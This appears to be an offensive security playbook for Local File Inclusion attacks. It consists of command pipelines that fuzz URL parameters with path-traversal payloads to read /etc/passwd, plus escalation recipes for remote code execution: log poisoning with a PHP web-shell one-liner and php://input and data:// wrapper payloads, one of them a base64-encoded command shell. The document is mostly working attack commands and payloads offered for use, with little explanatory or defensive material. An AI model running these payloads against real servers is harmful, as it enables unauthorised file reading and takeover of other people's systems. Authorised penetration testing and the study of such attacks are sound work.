# LFI (Local File Inclusion) Pipeline

> **Tip:** Use `setup_audit.sh` to generate the `target` file.

## 1. Identification
Find URLs with file-related parameters.

```bash
# GF Patterns
gf lfi < live_urls.txt > lfi_candidates.txt
```

## 2. Automated Fuzzing
Fuzz parameters with common LFI payloads.

```bash
# QSReplace with basic payload
cat lfi_candidates.txt | qsreplace "../../../../../etc/passwd" | httpx -silent -match-string "root:x:0:0" -o lfi_confirmed.txt

# FFUF with LFI wordlist
ffuf -u $TARGET/FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -mc 200 -mr "root:x:0:0"
```

## 3. Nuclei LFI
Use Nuclei's LFI templates.

```bash
nuclei -l live_urls.txt -tags lfi -o scans/nuclei_lfi.txt
```

## 4. Escalation to RCE (Manual/Semi-Auto)
If LFI is found, try to escalate.

### Log Poisoning
1. Inject PHP code into User-Agent: `<?php system($_GET['c']); ?>`
2. Include log file via LFI: `page=../../../../var/log/apache2/access.log&c=id`

### PHP Wrappers
1. **Filter (Read Source)**: `php://filter/convert.base64-encode/resource=index.php`
2. **Input (RCE)**: `php://input` (POST data: `<?php system('id'); ?>`)
3. **Data (RCE)**: `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==&c=id`
